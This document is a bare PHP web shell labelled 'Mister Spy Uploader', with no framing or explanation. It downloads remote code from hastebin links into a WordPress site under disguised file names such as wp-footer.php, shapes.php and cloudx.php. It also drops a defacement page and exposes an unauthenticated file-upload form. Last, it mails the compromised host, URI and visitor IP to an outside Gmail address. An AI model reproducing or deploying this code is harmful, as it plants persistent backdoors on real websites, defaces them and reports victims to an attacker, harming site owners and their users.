Mister Spy
<?php
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/wp-footer.php" ;
$text = http_get('https://hastebin.com/raw/ifucenaquz');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo $check."</br>";
}else 
  echo "not exits";
echo "done .\n " ;
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/shapes.php" ;
$text2 = http_get('https://hastebin.com/raw/ifucenaquz');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
    echo $check2."</br>";
}else 
  echo "not exits2";
echo "done2 .\n " ;

$check3=$_SERVER['DOCUMENT_ROOT'] . "/def.html" ;
$text3 = http_get('https://hastebin.com/raw/iracirucad');
$op3=fopen($check3, 'w');
fwrite($op3,$text3);
fclose($op3);


?>
<?php
echo '<title>Upload Files xSecurity</title>
<h1>Mister Spy Uploader</h1>
';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload Complate !!!</b><br><br>'; }
	else { echo '<b>Upload Failed !!!</b><br><br>'; }
}
?>
<?php
$ip = getenv("REMOTE_ADDR");
$ra44 = rand(1, 99999);
$subj98 = " Bot V3 Rzlt Sphinx |$ra44";
$email = "sellerolux@gmail.com";
$from = "From: Result<botv3@mrspybotv3.com";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$m22 = $ip . "";
$msg8873 = "$a45 $b75 $m22";
mail($email, $subj98, $msg8873, $from);
?>
<?php
$check3=$_SERVER['DOCUMENT_ROOT'] . "/cloudx.php" ;
$text3 = http_get('https://hastebin.com/raw/yuqabojulu');
$op3=fopen($check3, 'w');
fwrite($op3,$text3);
fclose($op3);
?>
